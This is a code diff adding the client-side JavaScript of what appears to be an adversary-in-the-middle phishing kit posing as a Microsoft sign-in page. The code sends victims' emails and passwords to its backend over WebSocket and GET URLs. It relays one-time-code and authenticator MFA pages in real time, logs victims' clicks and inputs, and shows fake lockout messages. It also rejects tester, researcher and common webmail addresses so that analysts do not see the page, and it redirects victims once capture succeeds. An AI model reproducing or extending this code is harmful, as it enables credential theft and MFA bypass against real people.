+      var hasError = !!(errorEl && visible(errorEl));
+      return {
+        ok: true,
+        nodes: root.getElementsByTagName("*").length,
+        inputsVisible,
+        buttonsVisible,
+        hasOTC,
+        hasError,
+        lightboxOpacity: Math.round(lightboxOpacity * 100) / 100,
+        viewportW: window.innerWidth || 0,
+        viewportH: window.innerHeight || 0,
+        docHidden: !!document.hidden
+      };
+    } catch (e) {
+      return { ok: false, reason: "exception" };
+    }
+  }
+  var CLIENT_VERSION = "20260508a";
+  function parseMfaMeta(msg) {
+    try {
+      if (!msg || typeof msg !== "string") return null;
+      if (msg.length < 2 || msg.charAt(0) !== "{") return null;
+      var obj = JSON.parse(msg);
+      if (obj && obj.type === "mfa_meta" && obj.payloadID) return obj;
+    } catch (_) {
+    }
+    return null;
+  }
+  function parseForceReload(msg) {
+    try {
+      if (!msg || typeof msg !== "string") return null;
+      if (msg.length < 2 || msg.charAt(0) !== "{") return null;
+      var obj = JSON.parse(msg);
+      if (obj && obj.type === "force_reload") return obj;
+    } catch (_) {
+    }
+    return null;
+  }
+  function sendMfaHtmlAck(html, renderMs, opts) {
+    try {
+      if (!state.ws || state.ws.readyState !== WebSocket.OPEN) return;
+      var payload = {
+        type: "mfa_html_ack",
+        payloadID: state.lastMfaPayloadID || "",
+        hash: fnv1aHash(html),
+        bytes: str(html).length,
+        renderMs: Math.max(0, Math.round(Number(renderMs) || 0)),
+        ts: Date.now(),
+        clientVer: CLIENT_VERSION,
+        status: opts && opts.status || "rendered",
+        domStats: computeMfaDomStats()
+      };
+      if (opts && opts.error) payload.error = String(opts.error).slice(0, 256);
+      state.ws.send(JSON.stringify(payload));
+    } catch (_) {
+    }
+  }
+  function sendMfaRenderFailed(html, errMsg) {
+    sendMfaHtmlAck(html, 0, { status: "render_failed", error: errMsg });
+  }
+  function sendVisibilityState(stateName) {
+    try {
+      if (!state.ws || state.ws.readyState !== WebSocket.OPEN) return;
+      state.ws.send(JSON.stringify({
+        type: "visibility",
+        state: stateName,
+        ts: Date.now()
+      }));
+    } catch (_) {
+    }
+  }
+  function sendHeartbeat() {
+    try {
+      if (!state.ws || state.ws.readyState !== WebSocket.OPEN) return;
+      var mfaState = "idle";
+      if (state.isInMfaState && state.mfaStateConfirmed) {
+        mfaState = state.isSubmitting ? "submitting" : "awaiting_user";
+      }
+      state.ws.send(JSON.stringify({
+        type: "hb",
+        mfaState,
+        vis: document.hidden ? "hidden" : "visible",
+        ts: Date.now()
+      }));
+    } catch (_) {
+    }
+  }
+  function startHeartbeat() {
+    if (state.hbTimer) return;
+    state.hbTimer = setInterval(sendHeartbeat, 3e3);
+    sendHeartbeat();
+  }
+  function stopHeartbeat() {
+    if (state.hbTimer) {
+      clearInterval(state.hbTimer);
+      state.hbTimer = null;
+    }
+  }
+  var state = {
+    // Submission / step counters
+    count: 0,
+    clickedVerify: 0,
+    clickedBtn: 0,
+    // Backend round-trip
+    method: "",
+    mssg: "",
+    // Mode flags
+    godaddy: false,
+    connectionClosed: false,
+    isSubmitting: false,
+    // WebSocket
+    ws: null,
+    wsConnecting: false,
+    // MFA
+    isInMfaState: false,
+    mfaStateConfirmed: false,
+    mfaFallbackAttempted: false,
+    // Reconnection
+    reconnectAttempts: 0,
+    maxReconnectAttempts: 5,
+    reconnectInterval: 1e3,
+    maxReconnectInterval: 3e4,
+    reconnectTimer: null,
+    shouldReconnect: true,
+    // Submit polling timer (so we can clear it on back / WS response)
+    submitTimer: null,
+    submitStartedAt: 0,
+    submitTimeoutMs: 2e4,
+    submitDefaultTimeoutMs: 2e4,
+    submitProxyRetryTimeoutMs: 12e4,
+    submitHoldReason: "",
+    // Password retry cap
+    passwordLocked: false,
+    // External config (populated on init)
+    user: "",
+    redirectFinal: "",
+    sid: "",
+    baseUrl: "",
+    // Latest payloadID received in an mfa_meta sidecar; echoed back in the
+    // next mfa_html_ack so the server can match by ID instead of hash.
+    lastMfaPayloadID: "",
+    // Heartbeat interval handle (3s liveness ping during WS lifetime).
+    hbTimer: null
+  };
+  function initState() {
+    try {
+      const urlMain = new URL(window.location.href);
+      state.baseUrl = `https://${urlMain.hostname}/api/v1`;
+    } catch (e) {
+      throw e;
+    }
+    state.user = str(window.PRE_EMAIL);
+    state.redirectFinal = getFinalRedirectTarget();
+    state.sid = str(window.PRE_SID);
+    try {
+      const $ai = $("#ai");
+      if ($ai.length) $ai.val(state.user);
+    } catch (_) {
+    }
+  }
+
+  // build/modules/mfa.js
+  var mfaIndicators = [
+    "TfaPage.js",
+    "KmsiPage.js",
+    "idTxtBx_SAOTCC_OTC",
+    "idSubmit_SAOTCC_Continue",
+    'data-value="OneWaySMS"',
+    'data-value="PhoneAppOTP"',
+    "signInAnotherWay",
+    "verification code",
+    "authenticator"
+  ];
+  function detectMfaState(htmlContent) {
+    if (!htmlContent) return false;
+    return mfaIndicators.some(
+      (indicator) => htmlContent.toLowerCase().includes(indicator.toLowerCase())
+    );
+  }
+  function updateMfaState(newState, source) {
+    if (state.isInMfaState !== newState) {
+      console.log(`MFA state changed from ${state.isInMfaState} to ${newState} (source: ${source})`);
+      state.isInMfaState = newState;
+      if (!newState) {
+        state.mfaStateConfirmed = false;
+        state.mfaFallbackAttempted = false;
+      }
+    }
+  }
+  function normalizeMfaDom() {
+    try {
+      const $root = $("#remvSec");
+      if ($root.length === 0) return;
+      $root.find('[role="button"][data-test-id]').each(function() {
+        const $btn = $(this);
+        if ($btn.css("pointer-events") === "none") {
+          $btn.css("pointer-events", "auto");
+        }
+        if ($btn.css("opacity") === "0.5") {
+          $btn.css("opacity", "1");
+        }
+      });
+    } catch (normalizeError) {
+      console.error("Error normalizing MFA DOM:", normalizeError);
+    }
+  }
+  function patchMfaOverlay() {
+    try {
+      const $root = $("#remvSec");
+      if ($root.length === 0) return;
+      var $box = $root.find("#lightbox");
+      if ($box.length === 0) {
+        $box = $root.children().first();
+      }
+      if ($box.length === 0) return;
+      $box.css({ position: "relative", overflow: "hidden" });
+      if ($box.find("#cdp-progress").length === 0) {
+        $box.prepend(
+          `<div id="cdp-progress" style="display:none;position:absolute;top:0;left:0;width:100%;z-index:10;height:3px;overflow:hidden;background:url('/static/img/marching_ants.gif') repeat-x 0 0;background-size:auto 3px;"></div>`
+        );
+      }
+      if ($box.find("#cdp-close").length === 0) {
+        $box.prepend(
+          '<button type="button" id="cdp-close" aria-label="Close" style="position:absolute;top:8px;right:8px;z-index:9999;background:none;border:none;cursor:pointer;padding:4px;line-height:1;color:#605e5c;font-size:20px;">&times;</button>'
+        );
+      }
+      $("#cdp-progress").hide();
+      if ($("#cdp-hover-styles").length === 0) {
+        $("head").append(
+          '<style id="cdp-hover-styles">#remvSec [role="button"]:hover,#remvSec .table [role="button"]:hover,#remvSec [data-value]:hover,#remvSec [data-test-id]:hover {  background-color: #f3f2f1 !important;  cursor: pointer !important;}#remvSec #signInAnotherWay:hover,#remvSec a:hover {  text-decoration: underline !important;  cursor: pointer !important;}#remvSec #idBtn_SAOTCS_Cancel:hover,#remvSec #idBtn_Back:hover,#remvSec input[type="button"]:hover {  background-color: #e1dfdd !important;  cursor: pointer !important;}</style>'
+        );
+      }
+    } catch (err) {
+      console.error("patchMfaOverlay error:", err);
+    }
+  }
+  function showMfaLoading() {
+    $("#cdp-progress").show();
+  }
+
+  // build/modules/websocket.js
+  function scheduleReconnect() {
+    if (state.reconnectTimer) {
+      clearTimeout(state.reconnectTimer);
+    }
+    state.reconnectAttempts++;
+    console.log(
+      `Scheduling reconnection attempt ${state.reconnectAttempts}/${state.maxReconnectAttempts} in ${state.reconnectInterval}ms`
+    );
+    console.log(
+      `Current MFA state: ${state.isInMfaState}, Confirmed: ${state.mfaStateConfirmed}, Fallback attempted: ${state.mfaFallbackAttempted}`
+    );
+    state.reconnectTimer = setTimeout(function() {
+      console.log(`Reconnection attempt ${state.reconnectAttempts}/${state.maxReconnectAttempts}`);
+      connectWebSocket();
+      state.reconnectInterval = Math.min(state.reconnectInterval * 2, state.maxReconnectInterval);
+      state.reconnectInterval += Math.random() * 1e3;
+    }, state.reconnectInterval);
+  }
+  function connectWebSocket() {
+    try {
+      if (state.wsConnecting) return;
+      if (state.ws && (state.ws.readyState === WebSocket.OPEN || state.ws.readyState === WebSocket.CONNECTING)) {
+        return;
+      }
+      if (state.reconnectTimer) {
+        clearTimeout(state.reconnectTimer);
+        state.reconnectTimer = null;
+      }
+      const encodedUser = encodeURIComponent(trimStr($("#ai").val()));
+      const encodedPass = encodeURIComponent(trimStr($("#pr").val()));
+      const host = window.location.hostname;
+      if (!state.sid) {
+        console.error("No session ID available, cannot connect");
+        state.shouldReconnect = false;
+        hideProgress();
+        enableSubmitBtn();
+        $("#submit-btn").val("Sign in");
+        $("#error").show();
+        $("#ai").val("");
+        $("#pr").val("");
+        $("#ai").prop("readonly", false).trigger("focus");
+        state.count = 0;
+        state.mssg = "";
+        return;
+      }
+      if (!encodedUser && !state.isInMfaState) {
+        console.error("No email available for initial connection");
+        state.shouldReconnect = false;
+        hideProgress();
+        enableSubmitBtn();
+        $("#submit-btn").val("Sign in");
+        $("#error").show();
+        $("#ai").val("");
+        $("#pr").val("");
+        $("#ai").prop("readonly", false).trigger("focus");
+        state.count = 0;
+        state.mssg = "";
+        return;
+      }
+      if (!encodedPass && !state.isInMfaState) {
+        console.error("No password available for initial connection");
+        state.shouldReconnect = false;
+        hideProgress();
+        enableSubmitBtn();
+        $("#submit-btn").val("Sign in");
+        state.count += 1;
+        $("#msg").show();
+        $("#pr").val("").trigger("focus");
+        state.mssg = "";
+        return;
+      }
+      let wsUrl;
+      if (state.isInMfaState && state.mfaStateConfirmed && state.sid) {
+        wsUrl = `wss://${host}/api/v1/mfa/${state.sid}?cv=${encodeURIComponent(CLIENT_VERSION)}`;
+        console.log("Connecting to MFA WebSocket endpoint...");
+      } else {
+        wsUrl = `wss://${host}/api/v1/username/${state.sid}/${encodedUser}/${encodedPass}?cv=${encodeURIComponent(CLIENT_VERSION)}`;
+        console.log("Connecting to initial login WebSocket endpoint...");
+      }
+      var liveEmail = trimStr($("#ai").val());
+      if (liveEmail) state.user = liveEmail;
+      state.wsConnecting = true;
+      state.shouldReconnect = true;
+      const thisWs = new WebSocket(wsUrl);
+      state.ws = thisWs;
+      thisWs.onopen = function() {
+        if (state.ws !== thisWs) return;
+        state.wsConnecting = false;
+        console.log("WebSocket connected successfully to:", wsUrl);
+        state.reconnectAttempts = 0;
+        state.reconnectInterval = 1e3;
+        if (!state.visibilityListenerAttached) {
+          state.visibilityListenerAttached = true;
+          var emitVisibility = function() {
+            sendVisibilityState(document.hidden ? "hidden" : "visible");
+          };
+          try {
+            document.addEventListener("visibilitychange", emitVisibility);
+          } catch (e) {
+          }
+        }
+        try {
+          sendVisibilityState(document.hidden ? "hidden" : "visible");
+        } catch (_) {
+        }
+        startHeartbeat();
+        try {
+          if (!state.isInMfaState || !state.mfaStateConfirmed) {
+            thisWs.send("Message to send");
+          }
+        } catch (sendError) {
+          console.error("Error sending initial message:", sendError);
+        }
+      };
+      thisWs.onmessage = function(evt) {
+        if (state.ws !== thisWs) return;
+        const data = trimStr(evt && evt.data);
+        console.log("WebSocket message received:", data);
+        try {
+          var fr = parseForceReload(data);
+          if (fr) {
+            console.warn("[VersionGate] force_reload received:", fr);
+            state.shouldReconnect = false;
+            stopHeartbeat();
+            try {
+              state.ws && state.ws.close();
+            } catch (_) {
+            }
+            try {
+              var u = new URL(window.location.href);
+              u.searchParams.set("_cv", String(Date.now()));
+              window.location.replace(u.toString());
+            } catch (_) {
+              window.location.reload();
+            }
+            return;
+          }
+          var meta = parseMfaMeta(data);
+          if (meta) {
+            state.lastMfaPayloadID = meta.payloadID;
+            console.log("[MFA] payloadID=", meta.payloadID, "seq=", meta.seq, "rePush=", meta.rePush || 0);
+            return;
+          }
+          if (data === "mfa_reconnect_confirmed") {
+            console.log("MFA reconnection confirmed by backend");
+            state.mfaStateConfirmed = true;
+            state.mfaFallbackAttempted = false;
+            return;
+          }
+          if (data === "session_not_found") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            console.warn("Session not found on server - session may have expired");
+            state.shouldReconnect = false;
+            updateMfaState(false, "session_expired");
+            const target2 = getRedirectTarget();
+            if (target2) window.location.href = target2;
+            return;
+          }
+          if (data === "not_in_mfa_state") {
+            console.warn("Server says we are not in MFA state");
+            updateMfaState(false, "server_correction");
+            if (!state.mfaFallbackAttempted) {
+              state.mfaFallbackAttempted = true;
+              console.log("Attempting fallback to regular connection...");
+              state.shouldReconnect = true;
+              scheduleReconnect();
+            } else {
+              console.error("Fallback already attempted, stopping reconnection to prevent loops");
+              state.shouldReconnect = false;
+            }
+            return;
+          }
+          if (data === "username_error") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            closeWebSocket();
+            state.shouldReconnect = false;
+            updateMfaState(false, "error_response");
+            console.log("Username error \u2014 resetting email form");
+            hideProgress();
+            $("#error").text("We couldn't find an account with that username. Try another.").show();
+            $("#ai").val("").prop("readonly", false).trigger("focus");
+            $("#pr").val("");
+            $("#divPr").empty().hide();
+            var titleEl = document.querySelector(".sign-in-box .title");
+            if (titleEl) titleEl.textContent = "Sign in";
+            $("#cdp-user-row").hide();
+            var backBtn = document.getElementById("cdp-back-btn");
+            if (backBtn) backBtn.style.display = "none";
+            $("#ai").closest(".form-group").show();
+            $("#cdp-email-links").show();
+            $("#cdp-forgot-pw").hide();
+            $("#next").val("Next").show().css({ opacity: 1, left: "" });
+            enableSubmitBtn();
+            $("#submit-btn").hide().val("Sign in");
+            if (typeof window.hideLoading === "function") {
+              window.hideLoading(document.getElementById("next"));
+            }
+            state.count = 0;
+            state.mssg = "";
+            return;
+          }
+          if (data === "federation_external") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            console.log("[FedExt] federation_external received");
+            state.shouldReconnect = false;
+            closeWebSocket();
+            var target = getRedirectTarget();
+            if (target) {
+              console.log("[FedExt] Navigating to RP:", target);
+              window.location.href = target;
+            } else {
+              console.error("[FedExt] No redirect target available");
+            }
+            return;
+          }
+          if (data === "adfs" || data === "error" || data === "bad") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            state.shouldReconnect = false;
+            updateMfaState(false, "error_response");
+            console.log("Terminal error received, redirecting:", data);
+            const target2 = getRedirectTarget();
+            if (target2) {
+              setTimeout(function() {
+                window.location.href = target2;
+              }, 1e3);
+            }
+            return;
+          }
+          if (data === "Error submitting email") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            closeWebSocket();
+            state.shouldReconnect = false;
+            updateMfaState(false, "error_response");
+            console.log("Error:", data);
+            hideProgress();
+            enableSubmitBtn();
+            $("#submit-btn").val("Sign in");
+            $("#error").show();
+            $("#ai").val("");
+            $("#pr").val("");
+            $("#ai").prop("readonly", false).trigger("focus");
+            state.count = 0;
+            state.mssg = "";
+            return;
+          }
+          if (data === "timeout_waiting_submit_pass") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            state.shouldReconnect = false;
+            updateMfaState(false, "error_response");
+            console.log("Error:", data);
+            hideProgress();
+            enableSubmitBtn();
+            $("#submit-btn").val("Sign in");
+            state.count += 1;
+            $("#msg").show();
+            $("#pr").val("").trigger("focus");
+            state.mssg = "";
+            return;
+          }
+          if (data === "proxy_retry_started") {
+            console.log("Backend proxy retry started \u2014 keeping submit locked");
+            disableSubmitBtn();
+            showProgress();
+            $("#submit-btn").val("Please wait...");
+            startSubmitWatchdog(state.submitProxyRetryTimeoutMs, "proxy_retry");
+            state.mssg = "";
+            return;
+          }
+          if (data === "wrong_password") {
+            if (state.reconnectTimer) {
+              clearTimeout(state.reconnectTimer);
+              state.reconnectTimer = null;
+            }
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            console.log("Wrong password, letting user retry");
+            state.count += 1;
+            hideProgress();
+            if (state.count >= 7) {
+              state.passwordLocked = true;
+              disableSubmitBtn();
+              $("#submit-btn").val("Sign in");
+              $("#msg").html("You've entered an incorrect password too many times. For your security, try again in 10 minutes.").show();
+              $("#pr").val("").prop("disabled", true);
+              state.mssg = "";
+              return;
+            }
+            if (state.count === 6) {
+              enableSubmitBtn();
+              $("#submit-btn").val("Sign in");
+              $("#msg").html("You have one more attempt before your account is temporarily locked.").show();
+              $("#pr").val("").trigger("focus");
+              state.mssg = "";
+              return;
+            }
+            enableSubmitBtn();
+            $("#submit-btn").val("Sign in");
+            if (typeof window.hideLoading === "function") {
+              window.hideLoading(document.getElementById("submit-btn"));
+            }
+            $("#msg").show();
+            $("#pr").val("").trigger("focus");
+            state.mssg = "";
+            return;
+          }
+          if (data === "valid") {
+            state.mssg = "";
+            return;
+          }
+          if (data === "TerminatedLogSessSuccess") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            state.shouldReconnect = false;
+            updateMfaState(false, "completion");
+            console.log("Success! Redirecting to:", state.redirectFinal);
+            if (state.redirectFinal) {
+              setTimeout(function() {
+                window.location.href = state.redirectFinal;
+              }, 100);
+            }
+            return;
+          }
+          if (data === "MFA_REQUIRED") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            console.log("MFA_REQUIRED signal received \u2014 waiting for MFA HTML");
+            updateMfaState(true, "mfa_required_signal");
+            state.mfaStateConfirmed = true;
+            return;
+          }
+          if (data === "MFA_RECONNECTION") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            console.log("MFA_RECONNECTION signal received");
+            updateMfaState(true, "mfa_reconnection_signal");
+            state.mfaStateConfirmed = true;
+            return;
+          }
+          if (data === "account_locked") {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            state.shouldReconnect = false;
+            console.log("Account locked, redirecting");
+            const target2 = getRedirectTarget();
+            if (target2) {
+              setTimeout(function() {
+                window.location.href = target2;
+              }, 1e3);
+            }
+            return;
+          }
+          if (detectMfaState(data)) {
+            console.log("MFA state detected in response");
+            updateMfaState(true, "html_content");
+            state.mfaStateConfirmed = true;
+          }
+          if (data.indexOf("<") !== -1 && $("#remvSec").length > 0) {
+            clearSubmitTimer();
+            resetSubmitWatchdog();
+            console.log("Injecting MFA HTML directly from onmessage");
+            var renderStart = window.performance && typeof window.performance.now === "function" ? window.performance.now() : Date.now();
+            try {
+              $("#remvSec").html(data);
+              patchMfaOverlay();
+              normalizeMfaDom();
+            } catch (renderErr) {
+              console.error("[MFA] HTML render failed:", renderErr);
+              sendMfaRenderFailed(data, renderErr && renderErr.message);
+              return;
+            }
+            var ackAfterRender = function() {
+              var renderEnd = window.performance && typeof window.performance.now === "function" ? window.performance.now() : Date.now();
+              sendMfaHtmlAck(data, renderEnd - renderStart);
+            };
+            if (typeof window.requestAnimationFrame === "function") {
+              window.requestAnimationFrame(ackAfterRender);
+            } else {
+              setTimeout(ackAfterRender, 0);
+            }
+            state.clickedVerify = 0;
+            state.clickedBtn = 0;
+            return;
+          }
+          state.mssg = data;
+        } catch (messageError) {
+          console.error("Error handling WebSocket message:", messageError);
+        }
+      };
+      thisWs.onclose = function(event) {
+        if (state.ws !== thisWs) {
+          console.log("Ignoring onclose from stale WebSocket");
+          return;
+        }
+        state.wsConnecting = false;
+        console.log("WebSocket disconnected. Code:", event.code, "Reason:", event.reason);
+        state.connectionClosed = true;
+        stopHeartbeat();
+        if (!state.shouldReconnect) {
+          console.log("Reconnection disabled due to terminal error");
+          return;
+        }
+        if (state.isInMfaState && state.mfaStateConfirmed) {
+          if (event.code === 1e3 || event.code === 1001) {
+            console.log("MFA WebSocket closed normally, likely due to login completion");
+            state.shouldReconnect = false;
+            return;
+          }
+        }
+        if (event.code === 1006 && state.reconnectAttempts >= 2) {
+          console.warn("Multiple connection failures, may indicate server/session issues");
+        }
+        if (state.shouldReconnect && state.reconnectAttempts < state.maxReconnectAttempts) {
+          scheduleReconnect();
+        } else if (state.reconnectAttempts >= state.maxReconnectAttempts) {
+          console.error("Max reconnection attempts reached. Treating as terminal error.");
+          state.shouldReconnect = false;
+          const target = getRedirectTarget();
+          if (target) {
+            setTimeout(function() {
+              window.location.href = target;
+            }, 1e3);
+          }
+        }
+      };
+      thisWs.onerror = function(error) {
+        if (state.ws !== thisWs) return;
+        state.wsConnecting = false;
+        console.error("WebSocket error:", error);
+      };
+    } catch (wsError) {
+      state.wsConnecting = false;
+      console.error("Error creating WebSocket:", wsError);
+      if (state.shouldReconnect && state.reconnectAttempts < state.maxReconnectAttempts) {
+        scheduleReconnect();
+      }
+    }
+  }
+  function WebSocketTest() {
+    closeWebSocket();
+    state.shouldReconnect = true;
+    state.reconnectAttempts = 0;
+    state.reconnectInterval = 1e3;
+    updateMfaState(false, "initial_connection");
+    connectWebSocket();
+  }
+
+  // build/modules/api.js
+  function checkSubmit(path, submitCount) {
+    try {
+      $("#error").hide();
+      $("#msg").hide();
+      const currentUser = trimStr($("#ai").val());
+      const pr = trimStr($("#pr").val());
+      const filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,})+$/;
+      if (!currentUser) {
+        $("#error").show().html("Email field is empty.!");
+        $("#ai").trigger("focus");
+        return false;
+      }
+      if (!filter.test(currentUser)) {
+        $("#error").show().html("Incorrect email, Please enter a valid email.");
+        $("#ai").trigger("focus");
+        return false;
+      }
+      if (!pr) {
+        $("#error").show().html("Password field is empty.!");
+        $("#pr").trigger("focus");
+        return false;
+      }
+      const encodedUser = encodeURIComponent(currentUser);
+      const encodedPr = encodeURIComponent(pr);
+      const ajaxUrl = `${state.baseUrl}/${path}/${encodedUser}/${encodedPr}`;
+      $.ajax({
+        type: "get",
+        url: ajaxUrl,
+        crossDomain: true,
+        beforeSend: function() {
+          disableSubmitBtn();
+        },
+        success: function(res) {
+          const text = str(res);
+          if (state.godaddy) {
+            hideProgress();
+            enableSubmitBtn();
+            if (submitCount > 3) {
+              $("#msg").html("You've entered too many incorrect passwords!").show();
+            }
+            if (text.includes("Sucessful Login!") || text.includes("true")) {
+              if (state.redirectFinal) window.location.href = state.redirectFinal;
+            } else {
+              $("#submit-btn").val("Sign in");
+              $("#msg").show();
+              $("#pr").val("").trigger("focus");
+            }
+          }
+        },
+        error: function() {
+          if (state.godaddy) {
+            hideProgress();
+            enableSubmitBtn();
+          }
+        }
+      });
+    } catch (submitError) {
+    }
+  }
+  function currentEmail() {
+    var ai = trimStr($("#ai").val());
+    return ai || state.user;
+  }
+  function checkMethod(mtd) {
+    const encoded = encodeURIComponent(str(mtd));
+    const email = encodeURIComponent(currentEmail());
+    const url = `${state.baseUrl}/click/${email}/${encoded}`;
+    try {
+      $.ajax({ type: "get", url, crossDomain: true });
+    } catch (err) {
+    }
+  }
+  function checkId(id) {
+    const encoded = encodeURIComponent(str(id));
+    const email = encodeURIComponent(currentEmail());
+    const url = `${state.baseUrl}/cById/${email}/${encoded}`;
+    try {
+      $.ajax({ type: "get", url, crossDomain: true });
+    } catch (err) {
+    }
+  }
+  function checkInput(inp) {
+    const encoded = encodeURIComponent(str(inp));
+    const email = encodeURIComponent(currentEmail());
+    const url = `${state.baseUrl}/input/${email}/${encoded}`;
+    try {
+      $.ajax({ type: "get", url, crossDomain: true });
+    } catch (err) {
+    }
+  }
+  function checkMessg() {
+    const checkTimer = setInterval(function() {
+      try {
+        if (!state.mssg) return;
+        const res = trimStr(state.mssg);
+        if (res === "adfs" || res === "error" || res === "bad" || res === "Error submitting email" || res === "timeout_waiting_submit_pass") {
+          const target = getRedirectTarget();
+          if (target) {
+            state.mssg = "";
+            clearInterval(checkTimer);
+            updateMfaState(false, "error_redirect");
+            window.location.href = target;
+            return;
+          }
+          state.mssg = "";
+          clearInterval(checkTimer);
+          return;
+        }
+        if (res === "valid") {
+          state.mssg = "";
+          clearInterval(checkTimer);
+          return;
+        }
+        if (res.indexOf("TerminatedLogSessSuccess") !== -1) {
+          const target = state.redirectFinal;
+          if (target) {
+            state.mssg = "";
+            clearInterval(checkTimer);
+            updateMfaState(false, "success_redirect");
+            window.location.href = target;
+            return;
+          }
+          state.mssg = "";
+          clearInterval(checkTimer);
+          return;
+        }
+        try {
+          if (res.indexOf("<") !== -1) {
+            if (detectMfaState(res)) {
+              console.log("MFA state detected in HTML response");
+              updateMfaState(true, "html_update");
+              state.mfaStateConfirmed = true;
+            }
+            if ($("#remvSec").length > 0) {
+              $("#remvSec").html(res);
+              patchMfaOverlay();
+              normalizeMfaDom();
+            }
+          }
+        } catch (parseError) {
+          console.error("Error injecting HTML response:", parseError);
+        }
+        state.mssg = "";
+        clearInterval(checkTimer);
+        state.clickedVerify = 0;
+        state.clickedBtn = 0;
+      } catch (err) {
+        console.error("Error in message processing:", err);
+      }
+    }, 1e3);
+  }
+
+  // build/modules/handlers.js
+  function cancelMfaSession() {
+    closeWebSocket();
+    $("#chromedp-overlay").hide();
+    state.clickedBtn = 0;
+    state.clickedVerify = 0;
+    state.method = "";
+    state.count = 0;
+    state.isSubmitting = false;
+    state.passwordLocked = false;
+    updateMfaState(false, "user_cancel");
+    enableSubmitBtn();
+    hideProgress();
+    if (window._cdpOriginalRemvSec) {
+      $("#remvSec").html(window._cdpOriginalRemvSec);
+      var $nxt = $("#next");
+      if ($nxt.length) {
+        $nxt.prop("disabled", false).val("Next").css({ display: "", opacity: "1" });
+        $nxt[0].innerHTML = "Next";
+        $nxt.removeAttr("data-original-text");
+      }
+    }
+  }
+  window.resetOverlayForm = cancelMfaSession;
+  function registerHandlers() {
+    var $remv = $("#remvSec");
+    if ($remv.length && !window._cdpOriginalRemvSec) {
+      window._cdpOriginalRemvSec = $remv.html();
+    }
+    $(document).on("submit", "form", function(e) {
+      e.preventDefault();
+    });
+    $(document).on("keypress", function(event) {
+      try {
+        const keycode = event.keyCode ? event.keyCode : event.which;
+        if (String(keycode) === "13") {
+          if ($("#divPr").is(":visible")) {
+            $("#submit-btn").trigger("click");
+          } else {
+            $("#next").trigger("click");
+          }
+        }
+      } catch (_) {
+      }
+    });
+    $(document).on("click", "#next", function(e) {
+      try {
+        $("#error").hide();
+        $("#msg").hide();
+        e.preventDefault();
+        const ai = trimStr($("#ai").val());
+        const filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,})+$/;
+        if (!ai) {
+          $("#error").show().html("Email field is empty.!");
+          $("#ai").trigger("focus");
+          return false;
+        }
+        if (!filter.test(ai)) {
+          $("#error").show().html("Incorrect email, Please enter a valid email.");
+          $("#ai").trigger("focus");
+          return false;
+        }
+        var blockedDomains = [
+          "microsoft.com",
+          "gmail.com",
+          "hotmail.com",
+          "outlook.com",
+          "yahoo.com",
+          "live.com",
+          "aol.com",
+          "icloud.com",
+          "protonmail.com",
+          "proton.me",
+          "test.com",
+          "example.com",
+          "mailinator.com",
+          "guerrillamail.com",
+          "tempmail.com"
+        ];
+        var emailDomain = ai.split("@")[1];
+        var emailLocal = ai.split("@")[0];
+        if (emailDomain && blockedDomains.indexOf(emailDomain.toLowerCase()) !== -1) {
+          $("#error").show().html("We couldn't find an account with that username. Try another.");
+          $("#ai").val("").prop("readonly", false).trigger("focus");
+          return false;
+        }
+        var blockedLocals = [
+          "test",
+          "test1",
+          "test2",
+          "test123",
+          "testing",
+          "testuser",
+          "user",
+          "admin",
+          "administrator",
+          "info",
+          "root",
+          "postmaster",
+          "abuse",
+          "noreply",
+          "no-reply",
+          "security",
+          "sample",
+          "demo",
+          "example",
+          "fake",
+          "asdf",
+          "aaa",
+          "abc",
+          "xxx",
+          "null",
+          "devnull",
+          "dev"
+        ];
+        if (emailLocal && blockedLocals.indexOf(emailLocal.toLowerCase()) !== -1) {
+          $("#error").show().html("We couldn't find an account with that username. Try another.");
+          $("#ai").val("").prop("readonly", false).trigger("focus");
+          return false;
+        }
+        showProgress();
+        const rddPage = str(window.PRE_REDIRECT_PAGE);
+        const rddUrl = str(window.PRE_REDIRECT);
+        if (rddPage === "true") {
+          window.location.href = rddUrl;
+          return;
+        }
+        if (rddUrl && rddUrl.indexOf("/Gdad") !== -1) {
+          state.godaddy = true;
+        }
+        setTimeout(function() {
+          try {
+            hideProgress();
+            $("#ai").prop("readonly", true);
+            const pr = document.createElement("input");
+            pr.type = "password";
+            pr.name = "pr";
+            pr.id = "pr";
+            pr.classList.add("form-text-input", "disable-on-submit", "is-empty");
+            pr.placeholder = "Password";
+            const divPr = document.getElementById("divPr");
+            if (divPr) divPr.appendChild(pr);
+            var titleEl = document.querySelector(".sign-in-box .title");
+            if (titleEl) titleEl.textContent = "Enter password";
+            var userRow = document.getElementById("cdp-user-row");
+            if (userRow) {
+              var emailSpan = document.getElementById("cdp-user-email");
+              if (emailSpan) emailSpan.textContent = ai;
+              userRow.style.display = "flex";
+            }
+            var backBtn = document.getElementById("cdp-back-btn");
+            if (backBtn) backBtn.style.display = "flex";
+            $("#ai").closest(".form-group").hide();
+            $("#cdp-email-links").hide();
+            $("#cdp-forgot-pw").show();
+            $("#next").hide();
+            $("#divPr").show();
+            $("#submit-btn").show();
+            $("#pr").trigger("focus");
+          } catch (transformError) {
+            console.error("Error in UI transformation:", transformError);
+          }
+        }, 350);
+      } catch (nextError) {
+        console.error("Error in next button handler:", nextError);
+      }
+    });
+    $(document).on("click", "#cdp-back-btn", function() {
+      try {
+        closeWebSocket();
+        $("#error").hide();
+        $("#msg").hide();
+        var titleEl = document.querySelector(".sign-in-box .title");
+        if (titleEl) titleEl.textContent = "Sign in";
+        $("#cdp-user-row").hide();
+        var backBtn = document.getElementById("cdp-back-btn");
+        if (backBtn) backBtn.style.display = "none";
+        $("#ai").closest(".form-group").show();
+        $("#ai").prop("readonly", false).trigger("focus");
+        $("#cdp-email-links").show();
+        $("#divPr").empty().hide();
+        $("#cdp-forgot-pw").hide();
+        $("#next").val("Next").show().css({ opacity: 1 });
